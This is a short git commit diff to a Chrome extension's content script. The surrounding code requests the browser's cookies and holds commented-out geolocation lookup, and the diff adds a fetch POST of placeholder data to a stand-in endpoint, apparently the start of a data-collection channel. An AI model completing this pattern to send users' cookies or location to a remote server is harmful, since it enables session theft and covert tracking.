0439989bc5fd7c9e865665d327b1dd7a1058aba1
Jiří Novák <63288402+TaraJura@users.noreply.github.com>
2024-02-24 00:29:00 +0100

    x

--- content.js
+++ content.js
@@ -4,6 +4,7 @@ chrome.runtime.sendMessage({action: "getCookies"}, function(response) {
 
 
 // GEOLOCATION
+
 //if ("geolocation" in navigator) {
   // Geolocation is supported, request location
   //navigator.geolocation.getCurrentPosition(function(position) {
@@ -22,3 +23,21 @@ chrome.runtime.sendMessage({action: "getCookies"}, function(response) {
 //  console.log("Geolocation is not supported by your browser");
 //}
 
+
+// Send data to the the processing server
+
+fetch('https://your-endpoint.com/post', {
+  method: 'POST', // Specify the method
+  headers: {
+    // Headers you want to send
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify({
+    // Your POST data
+    key: 'value',
+    anotherKey: 'anotherValue'
+  })
+})
+.then(response => response.json()) // Parsing the JSON response
+.then(data => console.log(data)) // Handling the data from the response
+.catch(error => console.error('Error:', error)); // Handling errors
